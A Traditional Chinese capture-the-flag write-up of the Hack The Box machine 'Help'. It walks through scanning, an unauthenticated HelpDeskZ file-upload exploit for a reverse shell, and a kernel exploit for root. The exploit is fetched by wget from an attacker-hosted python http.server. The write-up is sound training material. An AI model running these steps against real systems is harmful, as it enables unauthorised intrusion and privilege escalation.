## 1. 執行摘要 (Executive Summary)

### 測試範圍與目標：
1. 靶機名稱:Help
2. 難度:Easy
3. IP:10.129.230.159

### 主要發現：
1. 漏洞 ：利用舊版本公開漏洞透過檔案上傳漏洞達成遠端程式碼執行(RCE)（風險等級：Critical）
2. 漏洞 ：利用舊版本公開漏洞達成權限提升（風險等級：High）

### 攻擊鏈摘要：

攻擊者可以利用未經身份驗證的任意檔案上傳漏洞來取得遠端程式碼執行 (RCE)。取得存取權限後，核心也存在漏洞，攻擊者可以利用該漏洞來取得root權限。

### 潛在影響：

1. HelpDeskZ的版本過舊，公開漏洞會造成檔案上傳漏洞，讓攻擊者達成遠端程式碼執行，導致重要文件外洩。
2. Linux核心版本過舊，攻擊者可輕易權限提升，導致機密文件外洩或系統崩潰。

### 修復建議：

1. 將HelpDeskZ的版本升級成最新版，並以白名單限制上傳檔案類型。
2. Linux核心版本升級成最新版。

---

## 2. 技術發現與攻擊路徑詳述 (Findings)

### 2.1 資訊蒐集(Reconnaissance)

使用Nmap掃描開放埠
```bash
sudo nmap -sT -Pn --min-rate 5000 -p- 10.129.230.159
sudo nmap -sT -Pn -sV -sC -O -p22,80,3000 10.129.230.159
sudo nmap --script=vuln -p22,80,3000 10.129.230.159
```
<img width="761" height="229" alt="螢幕擷取畫面 2026-02-21 164352" src="https://github.com/user-attachments/assets/8bfa91d7-2ac0-4e91-a172-fbeb68f6c142" />
<img width="844" height="459" alt="螢幕擷取畫面 2026-02-21 164408" src="https://github.com/user-attachments/assets/6f7158d7-209e-4cab-9330-393b511ca4ac" />
<img width="730" height="587" alt="螢幕擷取畫面 2026-02-21 165001" src="https://github.com/user-attachments/assets/2dc377fc-8b1e-4dc4-bad2-66cc1ea3ad0f" />

將取得的URL寫入/etc/hosts

<img width="515" height="151" alt="螢幕擷取畫面 2026-02-21 164722" src="https://github.com/user-attachments/assets/c1bc4fa3-e6e4-404d-bcfa-9587678014c4" />


探索80,3000兩個頁面

<img width="1447" height="611" alt="螢幕擷取畫面 2026-02-21 164742" src="https://github.com/user-attachments/assets/14d1b5f9-882e-4275-9bbf-9e9be513e9f8" />
<img width="684" height="298" alt="螢幕擷取畫面 2026-02-21 164801" src="https://github.com/user-attachments/assets/d5f8d751-132c-4b0e-a046-3645d8d8af35" />



### 2.2 枚舉(Enumeration)

使用gobuster爆破目錄
```bash
sudo gobuster dir -u http://help.htb -w /usr/share/dirbuster/wordlists/directory-2.3-medium.txt
```
<img width="951" height="295" alt="螢幕擷取畫面 2026-02-21 165215" src="https://github.com/user-attachments/assets/f7e12b9b-95e7-4df6-91fd-2941292bfb46" />

查看80/support
<img width="1532" height="670" alt="螢幕擷取畫面 2026-02-21 165322" src="https://github.com/user-attachments/assets/97e7d9e7-f7c5-4d09-8f94-f04338c68933" />

查詢公開漏洞
```bash
searchsploit HelpDeskZ
```
<img width="967" height="175" alt="螢幕擷取畫面 2026-02-21 165633" src="https://github.com/user-attachments/assets/74766f67-cb57-4029-bb0f-a59ebb346360" />


### 2.3 初始存取(Initial Access)

從漏洞腳本可得知利用邏輯:上傳檔案→網站顯示不允許但還是上傳到後台→呼叫檔案→取得Shell，路徑在腳本內有，檔案名稱會被更改為「原檔案名+上傳時間(UNIX)」的MD5 Hash，因時差問題，本機與伺服器的上傳時間可能有差異，需要修改腳本內容使其對應，在此展示不用腳本的手動辦法。

找到上傳頁面並上傳文件

<img width="1337" height="639" alt="螢幕擷取畫面 2026-02-21 175623" src="https://github.com/user-attachments/assets/fd13ede4-43e9-4c61-a630-2d802206fc27" />
<img width="1325" height="580" alt="螢幕擷取畫面 2026-02-21 175637" src="https://github.com/user-attachments/assets/5468b2b8-fdaf-455c-b82d-ab951ab54e8b" />

查看POST請求了解上傳時間
<img width="1460" height="680" alt="螢幕擷取畫面 2026-02-21 183757" src="https://github.com/user-attachments/assets/48a35abc-823c-47c5-9a23-a6b283b7b8df" />

用[線上工具](https://www.epochconverter.com/)轉化為UNIX時間撮

<img width="1102" height="586" alt="螢幕擷取畫面 2026-02-21 183812" src="https://github.com/user-attachments/assets/0d062855-8f63-4c91-ac93-c95eea3e3823" />

將「原檔案名+上傳時間(UNIX)」利用[CyberChef](https://gchq.github.io/CyberChef/)編碼成MD5

<img width="1226" height="711" alt="螢幕擷取畫面 2026-02-21 183833" src="https://github.com/user-attachments/assets/a7465041-9790-4748-91f7-d426f655c7ef" />

根據腳本提供的URL呼叫反彈Shell

<img width="994" height="391" alt="螢幕擷取畫面 2026-02-21 183851" src="https://github.com/user-attachments/assets/d6db0ac6-a243-4fad-bfd5-5ac901df4e63" />
<img width="1079" height="191" alt="螢幕擷取畫面 2026-02-21 183918" src="https://github.com/user-attachments/assets/08aca687-fe37-46f4-8f36-71b81e145cd8" />
<img width="695" height="358" alt="螢幕擷取畫面 2026-02-21 184146" src="https://github.com/user-attachments/assets/36e44771-6821-44d7-a461-4db00fa2c6d5" />

### 2.4 權限提升(Privilege Escalation)

搜尋Linux核心版本
```bash
uname -a
```
<img width="891" height="80" alt="螢幕擷取畫面 2026-02-21 191454" src="https://github.com/user-attachments/assets/affadc76-a13c-4979-9574-bdcf4080b2de" />

搜尋可用漏洞
```bash
searchsploit linux 4.4.0
searchsploit -m 44298
```
<img width="1865" height="206" alt="螢幕擷取畫面 2026-02-21 191731" src="https://github.com/user-attachments/assets/ece173a4-1a71-47d3-adb8-43710e511938" />
<img width="1846" height="140" alt="螢幕擷取畫面 2026-02-21 191843" src="https://github.com/user-attachments/assets/3b491341-920e-4ff7-afa5-0bf2bdf8c816" />
<img width="769" height="177" alt="螢幕擷取畫面 2026-02-21 191923" src="https://github.com/user-attachments/assets/466ed41c-7d4a-41a2-9fa9-2b915d677b77" />

啟用Python http.server託管漏洞腳本
```bash
python3 -m http.server 8000
```
<img width="611" height="68" alt="螢幕擷取畫面 2026-02-21 191942" src="https://github.com/user-attachments/assets/7db5e52f-f13b-4b02-bf18-59dec46c2b42" />

在Shell中移動至可讀寫目錄，並下載漏洞腳本
```bash
wget http://10.10.14.229:8000/44298.c
```
<img width="729" height="211" alt="螢幕擷取畫面 2026-02-21 192121" src="https://github.com/user-attachments/assets/c40da9ad-81fd-4060-ad68-270900d8477b" />

編譯漏洞腳本
```bash
gcc -o a 44298.c
```
<img width="502" height="44" alt="螢幕擷取畫面 2026-02-21 192339" src="https://github.com/user-attachments/assets/4133b6a6-d8eb-4217-b6b6-f7dcaf1249f7" />

執行漏洞腳本
```bash
./a
```
<img width="476" height="132" alt="螢幕擷取畫面 2026-02-21 192347" src="https://github.com/user-attachments/assets/854eda5e-2842-416c-b1a1-5493373b9ba1" />

### 2.5 最終成果(Impact)

取得root權限

<img width="1297" height="278" alt="螢幕擷取畫面 2026-02-21 192622" src="https://github.com/user-attachments/assets/752e4f0e-1193-4352-b975-c05e4af25829" />

---

## 3. 學習回顧 (Lessons Learned)

### 成功的部分：

1. 即使有腳本存在，我也嘗試著利用線上工具或其他辦法來手動獲取控制權。
2. 線上已有修改好的腳本，可直接利用。

### 浪費時間的部分：

1. 3000port是利用GraphQL來進行SQLi，我並未嘗試，因為我看不出來3000跟GraphQL有什麼關係，直到我利用完80，已經取得控制權了，才爆破出有/graphql目錄。
2. 手動修改腳本是很好的練習，但線上已有改好的版本，若是實戰或考試，應善用Google節省時間，若是練習應盡量自己修改。

### 新知識點：

1. 因我未能看出GraphQL，事後對GraphQL做了了解。

### 與實戰對應：

1. 有多入口的目標實戰時很常遇到，應優先選擇有把握的入口，先進去再說。
2. 取得控制權後也不可放棄其他入口，應盡量為客戶了解更多系統漏洞。
